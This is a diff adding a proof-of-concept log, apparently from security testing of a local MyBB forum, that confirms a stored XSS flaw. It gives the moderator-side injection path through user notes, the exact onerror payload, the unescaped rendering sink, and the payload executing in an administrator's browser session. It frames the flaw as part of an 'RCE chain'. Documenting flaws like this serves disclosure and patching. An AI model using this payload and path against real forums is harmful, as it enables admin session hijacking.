@@ -1,0 +1,22 @@
+========================================================================
+VULN-004: Stored XSS in moderator user-notes (mod -> staff/admin)
+Target: http://localhost:25850
+========================================================================
+[INFO] exercising modcp.php:2287 update path -> member/viewnotes.twig:5 |raw sink
+[SETUP] creating a MODERATOR mod_59120b69 (Super Moderators gid 3: canmodcp=1, caneditprofiles=1)
+[SETUP] creating an ordinary target user target_4ba2e90f (uid=12) to attach the note to
+[INFO] moderator uid=11 logged in; my_post_key acquired
+[STEP] POST modcp.php do_editprofile uid=12 usernotes=<img onerror=...>
+[INFO] usernotes on the UPDATE path is SQL-escaped only (user.php:1452) — HTML survives
+[INFO] stored usernotes in DB = '<img src=x onerror="alert(document.domain);window.__xss=\'xssb6e977\'">'
+[PROOF] payload persisted with HTML intact in mybb_users.usernotes (no HTML-escape on update)
+[STEP] logging in as administrator (canmodcp staff — the victim)
+[STEP] admin opens member.php?action=viewnotes&uid=12
+[INFO] viewnotes HTTP 200; raw payload present=True; escaped=False
+[PROOF] the moderator-stored note is served UNescaped at viewnotes (member/viewnotes.twig:5 |raw) — markup reaches the staff DOM
+[STEP] opening viewnotes in real Chromium with the ADMIN cookie
+    DIALOG_FIRED msg="localhost" window.__xss="xssb6e977" marker="xssb6e977"
+[PROOF] Chromium executed the stored note in the ADMIN session — alert() fired (evidence/xss_fired.png)
+------------------------------------------------------------------------
+[OK] exploit confirmed — moderator-stored note executes JS in an admin session
+==> VULN-004: CONFIRMED — stored XSS mod->admin via user-notes (RCE chain)
